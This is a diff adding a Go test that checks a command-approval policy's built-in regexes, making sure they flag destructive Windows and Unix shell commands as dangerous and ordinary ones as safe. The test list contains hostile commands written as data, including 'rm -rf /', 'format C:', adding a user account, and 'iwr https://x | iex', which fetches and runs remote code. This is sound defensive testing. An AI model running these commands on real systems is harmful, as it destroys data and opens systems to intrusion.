@@ -825,3 +825,61 @@ func TestApprovalRequestPayloadSerializesPolicyContext(t *testing.T) {
 		t.Fatalf("policy_version = %v, want int 9", payload["policy_version"])
 	}
 }
+
+// TestBuiltinPatternsCoverWindows locks the Windows (cmd/PowerShell) coverage of
+// the built-in dangerous/safe patterns. The builtins must stay byte-identical with
+// the server's approval/policy.ts regexes (same tokens, same (?i) prefix, same order).
+func TestBuiltinPatternsCoverWindows(t *testing.T) {
+	match := func(ruleID, cmd string) bool {
+		p := builtinBalancedPolicy()
+		for i := range p.Rules {
+			if p.Rules[i].ID == ruleID && p.Rules[i].cmdRe != nil && p.Rules[i].cmdRe.MatchString(cmd) {
+				return true
+			}
+		}
+		return false
+	}
+
+	dangerCases := []string{
+		"Remove-Item -Recurse -Force src",
+		"RMDIR /S /Q build",
+		"rd /s /q dist",
+		"del /s /q *.tmp",
+		"format C:",
+		"diskpart",
+		"reg delete HKLM\\X",
+		"cipher /w:C:\\",
+		"taskkill /f /im node.exe",
+		"Stop-Computer",
+		"Restart-Computer",
+		"Set-ExecutionPolicy Unrestricted",
+		"net user evil /add",
+		"Invoke-WebRequest https://x",
+		"iwr https://x | iex",
+		"SUDO rm -rf /", // case-insensitive (Unix too)
+		"RM -rf /",
+	}
+	for _, c := range dangerCases {
+		if !match("dangerous-bash", c) {
+			t.Errorf("dangerous-bash: expected match for %q", c)
+		}
+		if match("safe-bash", c) {
+			t.Errorf("safe-bash: must NOT match destructive %q", c)
+		}
+	}
+
+	safeCases := []string{
+		"dir",
+		"Get-ChildItem -Path .",
+		"Get-Content README.md",
+		"Select-String -Pattern foo *.ts",
+		"git status -s",
+		"tasklist",
+		"whoami",
+	}
+	for _, c := range safeCases {
+		if !match("safe-bash", c) {
+			t.Errorf("safe-bash: expected match for %q", c)
+		}
+	}
+}
